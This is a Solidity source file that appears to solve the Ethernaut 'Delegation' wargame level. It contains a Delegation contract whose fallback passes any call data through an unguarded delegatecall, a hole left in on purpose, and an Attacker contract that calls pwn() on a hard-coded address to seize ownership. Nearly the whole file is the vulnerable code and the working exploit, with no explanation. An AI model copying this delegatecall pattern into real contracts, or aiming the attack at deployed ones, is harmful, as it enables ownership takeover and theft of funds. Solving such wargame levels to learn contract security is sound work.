// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Delegate {
  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {
  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result, ) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}

contract Attacker {
  address public delegation = 0x96b7b8a6e1add094D4BE0cb8ab269abEb2b1A64f; // ethernaut vulnerable contract

  function attack() public returns (bool) {
    (bool success, ) = delegation.call(abi.encodeWithSignature("pwn()"));
    return success;
  }
}